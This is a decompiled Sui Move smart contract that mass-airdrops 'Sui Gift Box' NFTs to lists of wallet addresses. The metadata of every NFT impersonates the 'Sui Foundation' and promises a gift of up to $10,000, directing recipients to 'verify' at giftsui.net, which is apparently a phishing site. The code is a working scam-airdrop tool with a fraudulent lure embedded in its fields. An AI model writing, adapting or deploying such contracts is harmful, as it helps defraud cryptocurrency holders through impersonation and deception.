module 0x85e054e01e502e26e1ebd317dfc451ca18a2f7d403e39338117e8070b60996de::suigift1008 {
    struct SUIGIFT1008 has drop {
        dummy_field: bool,
    }

    struct SUI_GIFTBOX_1008 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun GiftBoxAirdrop1008(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = SUI_GIFTBOX_1008{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Sui Gift Box"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1723631337/giftsuinet_0814_1_olo631.jpg"),
                description : 0x1::string::utf8(b"Gifting from Sui Network is LIVE on https://giftsui.net. Verify your Gift Box and claim your gift upto $10,000."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<SUI_GIFTBOX_1008>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Sui Gift Box"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1723631337/giftsuinet_0814_1_olo631.jpg"),
                description : 0x1::string::utf8(b"Gifting from Sui Network is LIVE on https://giftsui.net. Verify your Gift Box and claim your gift upto $10,000."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<SUI_GIFTBOX_1008>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: SUI_GIFTBOX_1008, arg1: &mut 0x2::tx_context::TxContext) {
        let SUI_GIFTBOX_1008 {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: SUIGIFT1008, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Sui Gift Box"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1723631337/giftsuinet_0814_1_olo631.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Gifting from Sui Network is LIVE on https://giftsui.net. Verify your Gift Box and claim your gift upto $10,000."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://giftsui.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Sui Foundation"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000"));
        let v4 = 0x2::package::claim<SUIGIFT1008>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<SUI_GIFTBOX_1008>(&v4, v0, v2, arg1);
        0x2::display::update_version<SUI_GIFTBOX_1008>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<SUI_GIFTBOX_1008>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

